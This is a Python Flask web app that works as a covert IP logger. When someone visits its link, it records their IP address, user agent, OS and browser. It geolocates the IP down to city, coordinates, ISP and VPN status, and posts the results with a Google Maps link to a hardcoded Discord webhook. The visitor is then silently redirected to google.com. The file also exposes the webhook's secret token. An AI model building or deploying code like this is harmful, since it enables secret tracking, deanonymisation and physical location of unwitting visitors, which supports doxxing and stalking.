from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

# Your send_info function
def send_info(info):
    webhook_url = "https://discord.com/api/webhooks/1441961597890199665/CYGzm7SaYp2T9zp2JLNBL-kqcgc8BuT-i8upr9A08g9aZ4DVLXSoLFDSpRUQ8pMdyLl4"
    ip = info.get('ip', 'N/A')
    user_agent = info.get('user_agent', 'N/A')
    os_str = info.get('os', 'N/A')
    browser_str = info.get('browser', 'N/A')

    try:
        ipinfo = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5).json()
    except Exception:
        ipinfo = {}

    provider = ipinfo.get('isp', 'Unknown')
    asn = ipinfo.get('as', 'Unknown')
    country = ipinfo.get('country', 'Unknown')
    region = ipinfo.get('regionName', 'Unknown')
    city = ipinfo.get('city', 'Unknown')
    lat = ipinfo.get('lat', 'Unknown')
    lon = ipinfo.get('lon', 'Unknown')
    timezone = ipinfo.get('timezone', 'Unknown')
    mobile = str(ipinfo.get('mobile', False))
    proxy = str(ipinfo.get('proxy', False))
    hosting = str(ipinfo.get('hosting', False))

    description = (
        f"**Access Detected!**\n\n"
        f"**IP Information:**\n"
        f"> **IP:** `{ip}`\n"
        f"> **Provider:** `{provider}`\n"
        f"> **ASN:** `{asn}`\n"
        f"> **Country:** `{country}`\n"
        f"> **Region:** `{region}`\n"
        f"> **City:** `{city}`\n"
        f"> **Location:** `{lat}, {lon}`\n"
        f"> **Timezone:** `{timezone}`\n"
        f"> **Mobile:** `{mobile}`\n"
        f"> **VPN:** `{proxy}`\n"
        f"> **Hosting:** `{hosting}`\n\n"
        f"**System Information:**\n"
        f"> **OS:** `{os_str}`\n"
        f"> **Browser:** `{browser_str}`\n\n"
        f"**User Agent:**\n```{user_agent}```"
    )

    fields = []
    if lat != "Unknown" and lon != "Unknown":
        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        fields.append({
            "name": "Google Maps Location",
            "value": f"[Click here to view]({maps_link})",
            "inline": False
        })

    embed = {
        "title": "Security Logger - Detection",
        "color": 0x00FFFF,
        "description": description,
        "fields": fields
    }

    try:
        requests.post(webhook_url, json={"embeds": [embed]}, timeout=5)
    except Exception as e:
        print(f"Failed to send Discord webhook: {e}")

# Main route
@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    device_type = "Desktop"
    browser = "Unknown"
    os_name = "Unknown"

    if ua:
        ua_lower = ua.lower()
        if "mobile" in ua_lower:
            device_type = "Mobile"
        if "chrome" in ua_lower:
            browser = "Chrome"
        elif "firefox" in ua_lower:
            browser = "Firefox"
        if "windows" in ua_lower:
            os_name = "Windows"
        elif "mac" in ua_lower:
            os_name = "MacOS"
        elif "linux" in ua_lower:
            os_name = "Linux"

    if ip == "127.0.0.1":
        ip = "8.8.8.8"

    geo_info = {
        "ip": ip,
        "user_agent": ua,
        "device_type": device_type,
        "browser": browser,
        "os": os_name
    }

    send_info(geo_info)
    return redirect("https://google.com")

# Cloud Run requires port 8080
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
